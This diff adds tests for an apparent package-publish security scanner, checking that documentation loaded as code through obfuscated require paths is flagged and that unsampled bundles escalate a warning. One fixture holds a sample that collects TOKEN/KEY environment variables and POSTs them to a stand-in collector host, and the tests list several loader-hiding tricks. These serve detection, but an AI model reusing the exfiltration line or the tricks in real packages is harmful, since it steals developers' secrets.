@@ -1839,6 +1839,64 @@ describe("review", () => {
     );
   });
 
+  test.each([
+    [
+      "a folded path join",
+      "module.exports = require(path.join(__dirname, '..', 'docs', 'guide.' + 'md'));",
+    ],
+    [
+      "an array join",
+      "const name = ['gui', 'de.m', 'd'].join('');\nmodule.exports = require('../docs/' + name);",
+    ],
+    [
+      "a registered loader",
+      "require.extensions['.md'] = require.extensions['.js'];\nmodule.exports = require('../docs/gu' + `ide`);",
+    ],
+    [
+      "a template-literal path, through the doc's own content",
+      "const target = `../docs/${n}.${ext}`;\nrequire(target);",
+    ],
+  ])(
+    "keeps documentation outside the files allowlist high when code loads it via %s",
+    (_, loader) => {
+      const manifest = { name: "pkg", version: "1.0.1", files: ["dist"], main: "dist/index.js" };
+      const file = (path, textSample) => ({ path, size: 1, sha256: path, flags: [], textSample });
+      const staged = [
+        file("package.json", JSON.stringify(manifest)),
+        file("dist/index.js", loader),
+        file(
+          "docs/guide.md",
+          "const t = Object.entries(process.env).filter(([k]) => /TOKEN|KEY/.test(k));\n" +
+            "fetch('https://collector.example/c', { method: 'POST', body: JSON.stringify(t) });\n",
+        ),
+      ];
+      const findings = deterministicFindings(staged, createPackageDiff([], staged)).filter(
+        (finding) => finding.ruleId === "file.outside-files-list",
+      );
+
+      expect(findings).toEqual([
+        expect.objectContaining({ file: "docs/guide.md", severity: "high" }),
+      ]);
+    },
+  );
+
+  test("keeps a capability-free doc high when shipped code registers a module loader", () => {
+    const manifest = { name: "pkg", version: "1.0.1", files: ["dist"], main: "dist/index.js" };
+    const file = (path, textSample) => ({ path, size: 1, sha256: path, flags: [], textSample });
+    const staged = [
+      file("package.json", JSON.stringify(manifest)),
+      file("dist/index.js", "require.extensions['.md'] = require.extensions['.js'];"),
+      file("docs/guide.md", "module.exports = 1;\n"),
+    ];
+    const findings = deterministicFindings(staged, createPackageDiff([], staged)).filter(
+      (finding) => finding.ruleId === "file.outside-files-list",
+    );
+
+    expect(findings).toEqual([
+      expect.objectContaining({ file: "docs/guide.md", severity: "high" }),
+    ]);
+  });
+
   test("matches glob entries in package.json files allowlist", () => {
     const staged = [
       {
@@ -2120,6 +2178,48 @@ describe("review", () => {
     expect(findings).toEqual([
       expect.objectContaining({ ruleId: "tar.suspicious-entry", severity: "info" }),
     ]);
+  });
+
+  test("escalates the retention-tier notice when a never-sampled bundle is what runs", () => {
+    const entries = [
+      {
+        kind: "retention-tier",
+        path: "<archive>",
+        detail: "2 file bodies were recorded hash-only",
+      },
+    ];
+    const changedBundle = [
+      { path: "dist/app.min.js", status: "modified", flags: ["content-skipped"] },
+      { path: "dist/app.min.js.map", status: "modified", flags: ["content-skipped"] },
+    ];
+    const severity = (stagedFiles) =>
+      tarSuspiciousEntryFindings(entries, { fileDiff: changedBundle, stagedFiles })[0].severity;
+    const hashOnly = changedBundle.map(({ path, flags }) => ({ path, flags }));
+    const sampled = (path, textSample) => ({ path, flags: [], textSample });
+
+    expect(severity([...hashOnly, sampled("package.json", '{"main":"./dist/app.min.js"}')])).toBe(
+      "medium",
+    );
+    expect(
+      severity([
+        ...hashOnly,
+        sampled("package.json", '{"exports":{".":{"require":"./dist/app.min.js"}}}'),
+      ]),
+    ).toBe("medium");
+    expect(
+      severity([
+        ...hashOnly,
+        sampled("package.json", '{"main":"index.js"}'),
+        sampled("index.js", "module.exports = require(path.join(__dirname, 'dist', 'app.min'));"),
+      ]),
+    ).toBe("medium");
+    expect(
+      severity([
+        ...hashOnly,
+        sampled("package.json", '{"main":"index.js"}'),
+        sampled("index.js", "module.exports = 1;\n//# sourceMappingURL=app.min.js.map"),
+      ]),
+    ).toBe("info");
   });
 
   test("escalates the retention-tier notice when an uninspected text tail file changed beside binaries", () => {
